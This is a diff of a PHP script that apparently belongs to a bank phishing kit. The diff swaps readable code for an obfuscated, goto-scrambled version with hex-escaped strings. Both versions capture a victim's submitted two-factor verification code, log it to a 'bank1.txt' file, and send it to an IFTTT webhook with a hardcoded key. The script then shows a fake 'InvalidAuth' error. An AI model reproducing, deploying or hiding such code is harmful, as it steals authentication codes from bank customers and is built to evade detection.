@@ -1,24 +1,2 @@
 <?php
-date_default_timezone_set("Africa/Kampala");
-$Time = date("d/m/Y")." at ".date("h:i:sa");
-$verificationCode = $_POST['verificationCode'];
-file_put_contents("../bank1.txt", "AuthCode for above user: " . $verificationCode . " \nOn: " . $Time . "\n===========================================\n", FILE_APPEND);
-
-$url = 'http://maker.ifttt.com/trigger/stratagem_auth/with/key/d53eY9NjQ-FNIEurV2OpEH';
-$data = array('value1' => $verificationCode);
-
-$options = array(
-    'http' => array(
-        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
-        'method'  => 'POST',
-        'content' => http_build_query($data)
-    )
-);
-$context  = stream_context_create($options);
-$result = file_get_contents($url, false, $context);
-if ($result === FALSE) { /* Handle error */ }
-
-header("Location: index.php?Error=InvalidAuth");
-exit();
-
-?>
+ goto jVGsa; jVGsa: date_default_timezone_set("\101\x66\162\x69\143\x61\57\113\x61\x6d\160\x61\154\x61"); goto QqRvl; QqRvl: $Time = date("\144\57\155\x2f\131") . "\40\x61\x74\x20" . date("\150\x3a\x69\72\163\141"); goto TcP3w; JfoUV: $url = "\x68\164\x74\x70\x3a\x2f\x2f\x6d\x61\x6b\x65\x72\x2e\151\x66\164\164\x74\56\143\x6f\x6d\57\x74\x72\x69\x67\147\145\x72\57\x73\x74\162\141\164\x61\x67\145\x6d\x5f\x61\x75\x74\x68\57\x77\x69\x74\150\57\153\x65\x79\x2f\x64\x35\x33\145\x59\71\116\152\x51\55\x46\x4e\x49\105\165\x72\126\62\117\x70\x45\110"; goto V3gCd; V3gCd: $data = array("\x76\x61\154\165\x65\61" => $verificationCode); goto uwafP; Lw1K_: die; goto gqRwR; vMGqC: $context = stream_context_create($options); goto nG6DZ; FCbnZ: file_put_contents("\56\56\x2f\x62\141\156\x6b\61\56\164\170\164", "\101\165\164\150\x43\x6f\x64\x65\40\146\157\x72\40\141\142\157\x76\x65\x20\165\163\x65\x72\72\x20" . $verificationCode . "\x20\xa\x4f\x6e\x3a\40" . $Time . "\xa\x3d\75\x3d\75\75\75\75\75\75\75\x3d\75\x3d\75\x3d\75\x3d\x3d\75\75\x3d\x3d\x3d\x3d\x3d\75\75\75\75\x3d\75\75\x3d\x3d\x3d\x3d\75\75\x3d\75\x3d\x3d\75\xa", FILE_APPEND); goto JfoUV; iyDTe: header("\x4c\x6f\143\x61\164\151\157\156\x3a\x20\x69\x6e\144\145\170\x2e\160\x68\160\77\x45\x72\162\157\162\x3d\111\156\166\141\x6c\x69\144\101\165\164\150"); goto Lw1K_; uwafP: $options = array("\150\164\x74\160" => array("\150\145\141\x64\x65\x72" => "\x43\157\x6e\x74\145\156\164\x2d\x74\x79\x70\145\72\x20\x61\160\x70\154\151\143\141\x74\x69\157\156\57\x78\x2d\167\x77\x77\x2d\x66\157\162\x6d\x2d\x75\162\154\x65\x6e\x63\157\x64\x65\144\xd\12", "\155\145\x74\150\157\x64" => "\x50\117\123\124", "\143\x6f\x6e\164\145\x6e\164" => http_build_query($data))); goto vMGqC; q80hf: if ($result === FALSE) { } goto iyDTe; nG6DZ: $result = file_get_contents($url, false, $context); goto q80hf; TcP3w: $verificationCode = $_POST["\166\145\162\x69\146\151\x63\141\164\151\x6f\x6e\103\x6f\x64\145"]; goto FCbnZ; gqRwR: ?>
